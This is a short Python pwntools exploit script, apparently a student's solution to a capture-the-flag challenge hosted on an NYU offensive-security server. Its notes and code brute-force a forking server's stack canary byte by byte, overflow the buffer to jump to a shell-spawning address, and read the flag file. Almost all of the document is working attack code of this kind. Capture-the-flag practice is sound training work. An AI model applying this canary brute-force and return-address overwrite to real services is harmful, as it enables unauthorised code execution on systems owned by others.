'''
give shell at 0x400afd
stack canary loaded at rbp-0x8
only overwrite the canary 1 byte at a time, that
length 137 crashes, either 1st or second byte of canary overwritten
1st byte of canary is at 137
have to set the test byte before the fork
'''
from pwn import * 

shell = p64(0x400afd)
count = 136
garbage = 'a' * count
canary = ""
server = "offsec-chalbroker.osiris.cyber.nyu.edu"
port = 1340
for _ in range(8):
    #We need to get each byte of the canary
    count += 1
    tries = 0
    print("Report: Bruting byte: " + str(count - 0x88))
    for i in range(257):
        tries += 1
        p = remote(server, port)
        p.recvuntil(":")
        p.sendline("jm5833")
        p.recvuntil("name?")
        p.sendline(str(count))
        p.recvuntil("data")
        p.sendline(garbage + canary + chr(i))
        response = p.recvall(timeout=1)
        if "bye!" in response:
            canary += chr(i)
            print "Found match ", count - 136, i 
            p.close()
            break
        p.close()
p  = remote(server, port)
p.recvuntil(":")
p.sendline("jm5833")
p.recvuntil("name?")
p.sendline("160")
p.recvuntil("data")
p.sendline(garbage + canary + 'a'*8 + shell)
for _ in range(10000000):
    pass
p.recvuntil("...\n\x00")
p.sendline("cat flag.txt")
flag = p.recvuntil("}")
p.close()
print(flag)
